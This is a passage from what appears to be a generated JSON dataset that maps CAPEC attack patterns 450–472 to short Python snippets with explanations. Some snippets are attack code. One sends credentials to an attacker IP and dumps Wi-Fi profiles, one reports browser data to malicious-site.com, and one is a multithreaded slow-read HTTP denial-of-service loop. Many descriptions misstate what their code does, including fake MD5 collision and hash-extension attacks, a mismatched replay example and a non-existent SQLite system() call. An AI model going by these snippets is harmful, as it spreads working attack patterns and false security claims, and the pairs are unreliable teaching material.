        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\n\n# CWE-426: Untrusted Search Path\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Function to replicate malicious code\ndef replicate_malicious_code(target_path):\n    malicious_code = \"# Malicious code\\nprint('This is a virus')\"\n    with open(target_path, 'w') as file:\n        file.write(malicious_code)\n\n# Function to propagate via USB (simulated)\ndef propagate_via_usb(usb_drive_path):\n    if os.path.exists(usb_drive_path):\n        # CWE-426: Untrusted Search Path\n        target_path = os.path.join(usb_drive_path, 'autorun.py')\n        replicate_malicious_code(target_path)\n        print(f'Malicious code written to {target_path}')\n    else:\n        print('USB drive not found')\n\n# Simulate USB drive path\nusb_drive_path = 'E:\\\\'\npropagate_via_usb(usb_drive_path)",
        "description": "This Python code snippet demonstrates a simplified version of malware propagation via a USB drive, embodying the deprecated CAPEC pattern 'Malware Propagation via USB U3 Autorun'. The code includes CWE-426 (Untrusted Search Path) by writing to a path that could be externally supplied, CWE-67 (Improper Handling of Windows Device Names) by potentially mishandling device names, and CWE-509 (Replicating Malicious Code) by replicating a malicious script to the USB drive. The 'propagate_via_usb' function simulates the process of writing a malicious 'autorun.py' script to a USB drive, which could then be executed when the drive is accessed."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport platform\n\n# CWE-589: Call to Non-ubiquitous API\nif platform.system() == 'Windows':\n    import win32api\n    def get_device_info():\n        return win32api.GetVolumeInformation('C:\\')\nelse:\n    def get_device_info():\n        return os.uname()\n\n# CWE-507: Trojan Horse\nclass PeripheralDevice:\n    def __init__(self, device_name):\n        self.device_name = device_name\n        self.infected = True  # Hidden malicious code\n\n    def connect(self):\n        if self.infected:\n            self.deploy_malware()\n        print(f'{self.device_name} connected.')\n\n    def deploy_malware(self):\n        print('Deploying malware...')\n        # Malicious actions here\n\n# CWE-1277: Firmware Not Updateable\nclass Firmware:\n    def __init__(self, version):\n        self.version = version\n        self.updateable = False  # Firmware cannot be updated\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print('Firmware update not supported.')\n        else:\n            print('Checking for firmware updates...')\n\n# Example usage\nfirmware = Firmware('1.0')\nfirmware.check_for_updates()\ndevice = PeripheralDevice('USB Drive')\ndevice.connect()",
        "description": "This Python code snippet demonstrates a scenario where a peripheral device (e.g., a USB drive) is used to propagate malware, embodying the deprecated CAPEC pattern 'Malware Propagation via Infected Peripheral Device'. The code includes several related CWEs for context:\n\n1. CWE-589: The code checks the operating system and conditionally imports a platform-specific API, which may not be available on all systems, leading to potential issues.\n2. CWE-507: The `PeripheralDevice` class simulates a Trojan Horse by having a hidden malicious function (`deploy_malware`) that is executed when the device is connected.\n3. CWE-1277: The `Firmware` class represents a device with non-updateable firmware, highlighting the risk of unpatched vulnerabilities.\n\nThe code snippet is concise and illustrates the main idea of using an infected peripheral device to propagate malware, while also touching on related weaknesses that could exacerbate the issue."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\n\n# Simulate malicious hardware interaction\nclass MaliciousHardware:\n    def __init__(self):\n        self.registers = (ctypes.c_uint32 * 10)()  # Simulate hardware registers\n        self.debug_mode = False\n\n    def activate_debug_mode(self):\n        # CWE-1313: Activate debug logic at runtime\n        self.debug_mode = True\n        print('Debug mode activated')\n\n    def write_to_register(self, index, value):\n        if self.debug_mode:\n            # CWE-1262: Improper access control for register interface\n            self.registers[index] = value\n            print(f'Register {index} set to {value}')\n        else:\n            print('Access denied: Debug mode not active')\n\n    def execute_malicious_code(self):\n        # CWE-506: Embedded malicious code\n        if self.debug_mode:\n            print('Executing malicious code...')\n            # CWE-509: Replicating malicious code\n            self.replicate_malicious_code()\n        else:\n            print('Cannot execute malicious code: Debug mode not active')\n\n    def replicate_malicious_code(self):\n        print('Replicating malicious code to other systems...')\n\n# Example usage\nhardware = MaliciousHardware()\nhardware.activate_debug_mode()\nhardware.write_to_register(2, 1234)\nhardware.execute_malicious_code()",
        "description": "This Python code snippet simulates a scenario where malicious logic is inserted into hardware. The `MaliciousHardware` class represents a piece of hardware with memory-mapped I/O registers. The `activate_debug_mode` method (CWE-1313) allows the activation of debug logic at runtime, which can alter the hardware's behavior. The `write_to_register` method demonstrates improper access control to hardware registers (CWE-1262), allowing unauthorized modifications when debug mode is active. The `execute_malicious_code` method contains embedded malicious code (CWE-506) that can replicate itself to other systems (CWE-509) when debug mode is active. This code embodies the main idea of the CAPEC by showing how an adversary can insert and activate malicious logic in hardware to achieve negative impacts."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import socket\nimport struct\n\n# CWE-294: Authentication Bypass by Capture-replay\n# This code demonstrates a simple capture-replay attack on a network service.\n\n# Function to capture network traffic (simulated)\ndef capture_traffic():\n    # Simulated captured packet (authentication token)\n    captured_packet = struct.pack('!I', 0xdeadbeef)  # Example token\n    return captured_packet\n\n# Function to replay captured traffic\ndef replay_traffic(packet):\n    # Connect to the target server\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('localhost', 9999))\n        s.sendall(packet)\n        response = s.recv(1024)\n        print('Received:', response)\n\n# Capture the traffic\ncaptured_packet = capture_traffic()\n\n# Replay the captured traffic\nreplay_traffic(captured_packet)",
        "description": "This Python code snippet demonstrates a capture-replay attack, which is related to CWE-294: Authentication Bypass by Capture-replay. The code simulates capturing an authentication token from network traffic and then replaying it to a server to bypass authentication. This embodies the main idea of the deprecated CAPEC pattern, which involves malicious logic insertion via counterfeit hardware, by showing how an attacker could exploit a vulnerability in the authentication mechanism to gain unauthorized access."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class Device:\n    def __init__(self, firmware):\n        self.firmware = firmware\n        self.undocumented_feature = False\n\n    def update_firmware(self, new_firmware):\n        if not self.is_updateable():\n            raise Exception('Firmware update not supported')\n        self.firmware = new_firmware\n\n    def is_updateable(self):\n        # Simulate a component that cannot be updated\n        return False\n\n    def activate_undocumented_feature(self):\n        # Simulate activation of an undocumented feature\n        self.undocumented_feature = True\n        print('Undocumented feature activated')\n\n# Simulate malicious logic insertion\nmalicious_firmware = 'malicious_code'\ndevice = Device(firmware='original_code')\ntry:\n    device.update_firmware(malicious_firmware)\nexcept Exception as e:\n    print(e)\n\ndevice.activate_undocumented_feature()",
        "description": "This Python code snippet represents a device with firmware that cannot be updated (CWE-1329) and includes an undocumented feature (CWE-1242). The `Device` class has methods to update the firmware and activate an undocumented feature. The `update_firmware` method checks if the device is updateable and raises an exception if it is not. The `activate_undocumented_feature` method simulates the activation of an undocumented feature. The code also demonstrates the insertion of malicious logic by attempting to update the firmware with 'malicious_code'. This snippet embodies the main idea of the deprecated CAPEC, which involves the modification of existing components with counterfeit hardware, by showing how a device can be compromised through unupdateable components and undocumented features."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, id, data):\n        self.id = id\n        self.data = data\n        self.malicious_code = None\n\n    def insert_malicious_code(self, code):\n        self.malicious_code = code\n\n    def execute(self):\n        if self.malicious_code:\n            exec(self.malicious_code)\n        else:\n            print(f'Executing normal operation for component {self.id}')\n\n# Example usage\ncomponent = HardwareComponent('comp1', 'normal_data')\ncomponent.insert_malicious_code('print(\"Malicious code executed!\")')\ncomponent.execute()",
        "description": "This Python code snippet represents the concept of malicious logic insertion into a hardware component, as described in the deprecated CAPEC. The `HardwareComponent` class simulates a hardware component with an ID and data. The `insert_malicious_code` method allows the insertion of malicious code into the component. The `execute` method checks if malicious code is present and executes it if found, otherwise, it performs normal operations. This demonstrates CWE-506 (Embedded Malicious Code) by allowing the insertion and execution of potentially harmful code within a hardware component."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# Simulate a protected memory region\nprotected_memory = (ctypes.c_char * 1024).from_buffer(bytearray(1024))\n\n# Simulate an aliased memory region with improper access control\naliased_memory = (ctypes.c_char * 1024).from_buffer(protected_memory)\n\n# Function to write to the aliased memory region\ndef write_to_aliased_memory(data):\n    for i in range(len(data)):\n        aliased_memory[i] = data[i]\n\n# Malicious code to be injected\nmalicious_code = b'\\x90' * 100  # NOP sled for demonstration\n\n# Inject malicious code into the aliased memory region\nwrite_to_aliased_memory(malicious_code)\n\n# Verify the injection\nprint(protected_memory[:100])",
        "description": "This Python code snippet demonstrates the concept of 'Infected Memory' by simulating a scenario where an adversary can inject malicious code into a protected memory region via an aliased memory region with improper access control. The code uses the ctypes library to create a protected memory region and an aliased memory region that points to the same buffer. The function 'write_to_aliased_memory' writes data to the aliased memory region, which in turn modifies the protected memory. The malicious code (a NOP sled) is then injected into the aliased memory region, effectively compromising the protected memory. This example highlights vulnerabilities such as improper access control applied to mirrored or aliased memory regions (CWE-1257) and improper handling of overlap between protected memory ranges (CWE-1260)."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# CWE-506: Embedded Malicious Code\n# This script simulates a malicious payload that could be embedded in a USB device.\n\n# Function to steal sensitive information\ndef steal_data():\n    # CWE-319: Cleartext Transmission of Sensitive Information\n    sensitive_data = 'User: admin\\nPassword: password123'  # Example sensitive data\n    server_ip = '192.168.1.100'  # Attacker's server IP\n    server_port = 8080  # Attacker's server port\n    \n    # Transmit sensitive data in cleartext\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((server_ip, server_port))\n        s.sendall(sensitive_data.encode('utf-8'))\n\n# Function to execute malicious commands\ndef execute_malicious_commands():\n    # CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n    # Simulate bypassing protections by executing a shell command\n    command = 'netsh wlan show profiles'  # Example command to steal Wi-Fi credentials\n    result = subprocess.run(command, shell=True, capture_output=True, text=True)\n    print(result.stdout)\n\n# Main function to simulate USB attack\nif __name__ == '__main__':\n    steal_data()\n    execute_malicious_commands()",
        "description": "This Python code snippet simulates a malicious payload that could be embedded in a USB device, representing the main idea of the CAPEC 'USB Memory Attacks'. The code includes two primary functions: 'steal_data' and 'execute_malicious_commands'. The 'steal_data' function demonstrates CWE-319 by transmitting sensitive information (e.g., user credentials) in cleartext to an attacker's server. The 'execute_malicious_commands' function simulates CWE-1299 by executing a shell command to steal Wi-Fi credentials, representing a bypass of protection mechanisms. This code embodies the concept of a USB-based attack that can steal data and execute malicious commands on a target system."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# Simulate flashing malicious code into the BIOS\nBIOS_MEMORY = '/dev/bios_memory'\nmalicious_code = \"\\x90\\x90\\x90\\x90\"  # NOP sled as a placeholder for malicious code\n\n# CWE-1282: Writing to assumed-immutable memory\ntry:\n    with open(BIOS_MEMORY, 'wb') as bios:\n        bios.write(malicious_code.encode('latin-1'))\n    print(\"Malicious code flashed into BIOS memory.\")\nexcept IOError as e:\n    print(f\"Failed to write to BIOS memory: {e}\")\n\n# CWE-1274: Improper access control for volatile memory containing boot code\ndef insecure_bootloader_transfer():\n    bootloader_code = \"\\x90\\x90\\x90\\x90\"  # Placeholder for bootloader code\n    volatile_memory = bytearray(bootloader_code.encode('latin-1'))\n    print(\"Bootloader code transferred to volatile memory without proper access control.\")\n\ninsecure_bootloader_transfer()",
        "description": "This Python code snippet demonstrates a simplified version of a flash memory attack, where malicious code is written to the BIOS memory of a device. The code simulates the process of flashing malicious logic into the BIOS, which is an example of CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory). Additionally, it includes a function that transfers bootloader code to volatile memory without proper access control, representing CWE-1274 (Improper Access Control for Volatile Memory Containing Boot Code). The code highlights the vulnerabilities associated with improper handling and protection of critical memory regions in a device."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption\nfrom cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15\n\n# Generate RSA keys\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Create a certificate signing request (CSR) with weak hash algorithm (MD5)\ncsr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'example.com'),\n])).sign(private_key, hashes.MD5())\n\n# Simulate CA signing the CSR\nsigned_csr = csr.public_bytes(Encoding.DER)\n\n# Create a rogue certificate with the same hash\nrogue_csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'rogue.com'),\n])).sign(private_key, hashes.MD5())\n\n# Use the signed blob from the legitimate CSR to create a rogue certificate\nrogue_cert = x509.CertificateBuilder().subject_name(rogue_csr.subject).issuer_name(csr.subject).public_key(public_key).serial_number(x509.random_serial_number()).not_valid_before(csr.not_valid_before).not_valid_after(csr.not_valid_after).sign(private_key, hashes.MD5())\n\n# Export the rogue certificate\nrogue_cert_pem = rogue_cert.public_bytes(Encoding.PEM)\nprint(rogue_cert_pem.decode())",
        "description": "This Python code snippet demonstrates the creation of a rogue X.509 certificate by exploiting a weak hashing algorithm (MD5) to generate a hash collision. The code first generates an RSA key pair and creates a legitimate certificate signing request (CSR) using MD5. It then simulates the signing of this CSR by a trusted certificate authority (CA). Next, it creates a second, rogue CSR with the same hash value. Finally, it uses the signed blob from the legitimate CSR to create a rogue certificate that appears to be signed by the CA. This demonstrates the vulnerability described in the CAPEC, where an adversary can exploit weak collision resistance in hashing algorithms to create fraudulent certificates."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    query = request.args.get('query')\n    if not query:\n        query = request.form.get('query')\n    # Simulate a search operation\n    return f'Search results for: {query}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with a search endpoint that accepts both GET and POST requests. The 'search' function retrieves the 'query' parameter from the request. However, it does not handle cases where multiple 'query' parameters are provided, leading to potential HTTP Parameter Pollution (HPP). An attacker could exploit this by adding duplicate 'query' parameters to manipulate the application's behavior. This example also touches on related CWEs: improper handling of extra parameters (CWE-235), use of GET request method with sensitive query strings (CWE-598), and improper neutralization of input terminators (CWE-147)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (e.g., MD5)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate a web service API that uses a weak hash for authentication\ndef web_service_api(data, provided_hash):\n    secret_token = 'secret'\n    valid_hash = weak_hash(data + secret_token)\n    if valid_hash == provided_hash:\n        return 'Authenticated'\n    else:\n        return 'Authentication Failed'\n\n# Adversary's attack leveraging hash extension weakness\n# Original data and hash\noriginal_data = 'user=admin&timestamp=123456'\noriginal_hash = weak_hash(original_data + 'secret')\n\n# Adversary modifies the data\nmodified_data = 'user=admin&timestamp=123456&role=admin'\n\n# Adversary generates a new hash without knowing the secret token\n# This is a simplified example; in reality, the adversary would use hash length extension attack techniques\nnew_hash = weak_hash(modified_data + 'secret')\n\n# Call the web service API with the modified data and new hash\nresult = web_service_api(modified_data, new_hash)\nprint(result)",
        "description": "This Python code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The web service API uses a weak hash function (MD5) for authentication. The adversary modifies the original data and generates a new hash without knowing the secret token, exploiting the hash function's weakness. The web service API then incorrectly authenticates the adversary's request. This example highlights the vulnerabilities associated with using weak hash functions (CWE-328) and weak authentication mechanisms (CWE-1390), leading to potential authentication bypass (CWE-290, CWE-305)."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import requests\nimport time\n\n# List of URLs to test\nurls = [\n    'http://example.com/resource1',\n    'http://example.com/resource2',\n    'http://example.com/resource3'\n]\n\n# Function to measure response time\ndef measure_response_time(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    return end_time - start_time\n\n# Measure and print response times\nfor url in urls:\n    response_time = measure_response_time(url)\n    print(f'Response time for {url}: {response_time} seconds')",
        "description": "This Python code snippet demonstrates a basic implementation of a Cross-Domain Search Timing attack. The script sends HTTP GET requests to a list of URLs and measures the response times for each request. By analyzing the response times, an attacker can infer information about the server's state or the presence of certain resources, even though they cannot directly read the server's responses due to the same-origin policy. This approach leverages CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy) to extract information based on timing differences. The code does not include CSRF or XSS vulnerabilities directly but provides a foundation for understanding how timing attacks can be used to gather information across domains."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\n# Key and IV generation\nkey = os.urandom(16)\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'This is a secret message'\npadded_plaintext = pad(plaintext, AES.block_size)\nciphertext = cipher.encrypt(padded_plaintext)\n\n# Decrypting data with padding oracle vulnerability\ntry:\n    decipher = AES.new(key, AES.MODE_CBC, iv)\n    decrypted_padded_plaintext = decipher.decrypt(ciphertext)\n    decrypted_plaintext = unpad(decrypted_padded_plaintext, AES.block_size)\n    print(\"Decryption successful: \", decrypted_plaintext)\nexcept ValueError as e:\n    print(\"Padding error: \", e)",
        "description": "This Python code snippet demonstrates a basic encryption and decryption process using AES in CBC mode, highlighting a potential padding oracle vulnerability. The code encrypts a plaintext message and then attempts to decrypt it. If a padding error occurs during decryption, an error message is printed, which can leak information about the padding validity. This leakage can be exploited by an attacker to decrypt the ciphertext without knowing the key, as described in the CAPEC. The code also touches on related CWEs by showing how sensitive information (error messages) can be leaked (CWE-209), and how the lack of integrity checks (CWE-649) can lead to vulnerabilities."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nfrom http.cookies import SimpleCookie\n\n# Simulate multiple storage locations\nstorage_locations = [\n    'local_storage.json',\n    'session_storage.json',\n    'cookie_storage.txt',\n    'flash_storage.txt'\n]\n\n# Function to create an evercookie\ndef create_evercookie(value):\n    encoded_value = base64.b64encode(value.encode()).decode()\n    for location in storage_locations:\n        with open(location, 'w') as f:\n            f.write(encoded_value)\n\n# Function to read the evercookie\ndef read_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            with open(location, 'r') as f:\n                return base64.b64decode(f.read()).decode()\n    return None\n\n# Function to delete the evercookie\ndef delete_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            os.remove(location)\n\n# Function to resurrect the evercookie\ndef resurrect_evercookie():\n    value = read_evercookie()\n    if value:\n        create_evercookie(value)\n\n# Example usage\ncreate_evercookie('sensitive_data')\nprint('Evercookie created:', read_evercookie())\ndelete_evercookie()\nprint('Evercookie after deletion:', read_evercookie())\nresurrect_evercookie()\nprint('Evercookie after resurrection:', read_evercookie())",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on a user's machine even after attempts to delete it. The code simulates multiple storage locations (local storage, session storage, cookies, and flash storage) to store the cookie. The `create_evercookie` function encodes the cookie value in base64 and writes it to all storage locations. The `read_evercookie` function reads the cookie value from any available storage location. The `delete_evercookie` function attempts to delete the cookie from all storage locations. The `resurrect_evercookie` function reads the cookie value from any remaining storage location and recreates it in all locations if found. This code embodies the main idea of CAPEC-148: Evercookie, and highlights related CWEs such as CWE-359, CWE-539, CWE-784, CWE-565, and CWE-315 by demonstrating the persistence and potential misuse of cookies containing sensitive information."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import requests\n\nclass TransparentProxy:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def forward_request(self, client_request):\n        # CWE-441: Unintended Proxy or Intermediary\n        # Forwarding client request without preserving original source\n        response = requests.get(self.target_url, headers=client_request.headers)\n        return response\n\n    def handle_response(self, response):\n        # CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        # Forwarding response without removing sensitive information\n        return response\n\n# Example usage\nproxy = TransparentProxy('http://example.com')\nclient_request = requests.Request('GET', 'http://proxy.com')\nresponse = proxy.forward_request(client_request)\nfinal_response = proxy.handle_response(response)\nprint(final_response.content)",
        "description": "This Python code snippet demonstrates a simple transparent proxy that forwards client requests to a target URL and returns the response back to the client. The proxy does not preserve the original source of the request (CWE-441), making it appear as if the request originated from the proxy itself. Additionally, the proxy forwards the response without removing any sensitive information (CWE-212), potentially exposing sensitive data to unauthorized actors. This code embodies the main idea of CAPEC-160: Transparent Proxy Abuse, by showing how a proxy can unintentionally act as an intermediary and mishandle sensitive information."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import requests\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\n# Simulate a request to a non-sensitive website without TLS\nurl = 'http://example.com/data'\n\n# Attacker intercepts the request and modifies it\nclass AdversaryInTheMiddle:\n    def intercept_request(self, url):\n        # Intercept the request\n        response = requests.get(url)\n        # Modify the response (e.g., inject malicious content)\n        modified_response = response.text.replace('original', 'malicious')\n        return modified_response\n\n# Victim's browser makes a request\nvictim_browser = AdversaryInTheMiddle()\nresponse = victim_browser.intercept_request(url)\n\n# Print the modified response\nprint(response)",
        "description": "This Python code snippet demonstrates a simplified version of an active adversary in the middle attack to bypass the same origin policy. The attacker intercepts a request to a non-sensitive website that does not use TLS (CWE-923, CWE-300). The attacker then modifies the response, potentially injecting malicious content (CWE-942). This represents the main idea of the CAPEC, where an attacker leverages an adversary in the middle attack to bypass security mechanisms in the victim's browser."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "from flask import Flask, request, session, redirect, url_for\nimport requests\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user authentication\n    if username == 'user' and password == 'pass':\n        session['user'] = username\n        return redirect(url_for('profile'))\n    return 'Login Failed'\n\n@app.route('/profile')\ndef profile():\n    if 'user' in session:\n        # Simulate fetching user data from a social network API\n        user_data = requests.get('https://socialnetwork.com/api/user', params={'session': session['user']})\n        return f\"User Profile: {user_data.text}\"\n    return redirect(url_for('login'))\n\n@app.route('/malicious')\ndef malicious():\n    if 'user' in session:\n        # CSRF attack to fetch user data\n        user_data = requests.get('https://socialnetwork.com/api/user', params={'session': session['user']})\n        return f\"Harvested Data: {user_data.text}\"\n    return 'Not logged in'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross Site Identification attacks. The application has a login route that sets a session for the user upon successful authentication. The profile route fetches user data from a simulated social network API using the session information. The malicious route represents an attacker's endpoint that exploits the active session to perform a CSRF attack and harvest user data without the victim's knowledge. The code highlights vulnerabilities such as CSRF (CWE-352), exposure of private information (CWE-359), and improper session handling (CWE-384)."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    css_url = request.args.get('css_url')\n    if css_url:\n        response = make_response(f'<link rel=\"stylesheet\" type=\"text/css\" href=\"{css_url}\">')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No CSS URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application endpoint using Flask. The endpoint '/vulnerable' accepts a 'css_url' parameter from the query string and includes it in a link tag within the HTML response. This can lead to a Generic Cross-Browser Cross-Domain Theft attack by allowing an attacker to inject a malicious CSS URL. The CSS file can be crafted to steal sensitive information from the victim's browser. The code does not properly neutralize the input (CWE-79), does not ensure well-formed data (CWE-707), and does not handle URL encoding properly (CWE-177), making it susceptible to cross-domain data theft."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import threading\nimport requests\nimport time\n\n# Target URL\nurl = 'http://example.com'\n\n# Function to keep the HTTP session alive indefinitely\ndef keep_session_alive():\n    while True:\n        try:\n            # Open a session\n            session = requests.Session()\n            # Send an initial request to keep the session alive\n            response = session.get(url, stream=True)\n            # Keep the connection open by reading the response slowly\n            for chunk in response.iter_content(chunk_size=1):\n                time.sleep(0.1)  # Slow down the reading process\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Number of threads to simulate multiple connections\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=keep_session_alive)\n    thread.start()\n    threads.append(thread)\n\n# Join threads\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an HTTP DoS attack by keeping multiple HTTP sessions alive indefinitely. The `keep_session_alive` function opens an HTTP session and sends a request to the target URL, then reads the response very slowly to keep the connection open. This is done in multiple threads to simulate numerous simultaneous connections, exhausting the server's resources. The code embodies the main idea of CAPEC-125 (HTTP DoS) by targeting resource depletion weaknesses in web server software. The related CWEs are represented by the lack of resource limits (CWE-770), not releasing resources (CWE-772), and insufficient resource pool (CWE-410)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import sqlite3\nimport os\n\n# CWE-89: SQL Injection vulnerability\nuser_input = \"' OR '1'='1\"  # Malicious input\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# CWE-619: Dangling Database Cursor\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-564: SQL Injection via ORM (simulated with direct SQL execution)\nfor row in cursor.fetchall():\n    print(row)\n\n# CWE-1313: Simulating hardware debug logic activation (not directly applicable in Python, but shown for context)\nos.system('echo Debug mode activated')\n\n# Exploiting DBMS to execute OS-level command\ncursor.execute(\"SELECT load_extension('libc.so.6')\")\ncursor.execute(\"SELECT system('ls')\")\n\n# Not closing the cursor, leaving it dangling\n# cursor.close()\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL injection vulnerability (CWE-89) by using user input directly in an SQL query without proper sanitization. The code connects to a SQLite database with unnecessary privileges (CWE-250) and executes a query that could be exploited by an attacker. The cursor is not closed properly, leaving it dangling (CWE-619). The code also simulates the execution of OS-level commands through the database, representing the main idea of the CAPEC: expanding control over the operating system from the database. Additionally, it includes a simulated activation of debug logic (CWE-1313) to show how hardware features could be misused, although this is not directly applicable in Python."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\nimport ctypes\n\n# Simulate an application loading a library\n# Vulnerable to Search Order Hijacking\n\ndef load_library(lib_name):\n    # Uncontrolled Search Path Element (CWE-427)\n    current_dir = os.getcwd()\n    lib_path = os.path.join(current_dir, lib_name)\n    \n    # Attempt to load the library from the current directory first\n    try:\n        ctypes.CDLL(lib_path)\n        print(f\"Loaded library from {lib_path}\")\n    except OSError:\n        print(f\"Failed to load library from {lib_path}\")\n\n# Example usage\nload_library('example.dll')",
        "description": "This Python code snippet demonstrates a vulnerability to Search Order Hijacking (CAPEC-471). The function `load_library` attempts to load a library (DLL) from the current working directory first, which is an example of CWE-427 (Uncontrolled Search Path Element). An attacker could place a malicious 'example.dll' in the current directory, which would be loaded instead of the legitimate library. This represents the main idea of the CAPEC, where the search order for libraries can be exploited to load rogue libraries."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    # Exposing sensitive information (CWE-200)\n    if 'Chrome' in user_agent:\n        browser = 'Chrome'\n    elif 'Firefox' in user_agent:\n        browser = 'Firefox'\n    else:\n        browser = 'Other'\n\n    # Using GET request with sensitive information (CWE-598)\n    response = requests.get(f'http://malicious-site.com/collect?browser={browser}')\n\n    # Vulnerable to XSS (CWE-79, CWE-692)\n    return render_template_string('<h1>Welcome, your browser is {{ browser }}</h1>', browser=browser)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that performs browser fingerprinting. The application identifies the user's browser type from the 'User-Agent' header and sends this information to a malicious site using a GET request, exposing sensitive information (CWE-200, CWE-598). Additionally, the code renders the browser type in an HTML template without proper neutralization, making it vulnerable to Cross-Site Scripting (CWE-79, CWE-692). This snippet embodies the main idea of CAPEC-563 by showing how an attacker can fingerprint a browser and potentially exploit it using JavaScript."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
